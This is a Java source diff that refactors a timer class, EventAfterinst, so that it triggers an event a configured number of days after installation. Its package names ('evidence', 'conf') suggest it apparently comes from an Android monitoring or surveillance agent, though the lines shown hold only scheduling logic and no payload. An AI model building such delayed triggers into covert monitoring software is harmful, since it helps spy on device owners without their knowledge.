@@ -10,7 +10,7 @@ import com.android.service.conf.ConfEvent;
 import com.android.service.conf.ConfigurationException;
 import com.android.service.evidence.Markup;
 
-public class EventAfterinst extends BaseTimer implements WaitCallback {
+public class EventAfterinst extends BaseTimer {
 
 	private int days;
 	private Date date;
@@ -37,7 +37,7 @@ public class EventAfterinst extends BaseTimer implements WaitCallback {
 	}
 
 	@Override
-	protected void actualEnable() {
+	protected void actualStart() {
 		Calendar calendar = GregorianCalendar.getInstance(TimeZone.getTimeZone("GMT"));
 		calendar.setTime(date);
 		long nowMillis = calendar.getTimeInMillis();
@@ -47,22 +47,22 @@ public class EventAfterinst extends BaseTimer implements WaitCallback {
 
 		long delay = triggerMillis - nowMillis;
 
-		startAsyncWait(this, delay);
-		
+		if(delay>0){
+			setDelay(delay);
+			setPeriod(NEVER);
+		}else{
+			setDelay(SOON);
+		}	
 	}
 
 	
 	@Override
-	protected void actualDisable() {
-		stopCondition();
+	protected void actualStop() {
 	}
 
-	public boolean afterWait(boolean interrupted) {
-		if(!interrupted){
-			startCondition();
-		}
-		
-		return interrupted;
+	@Override
+	protected void actualGo() {
+		onEnter();
 	}
 
 }
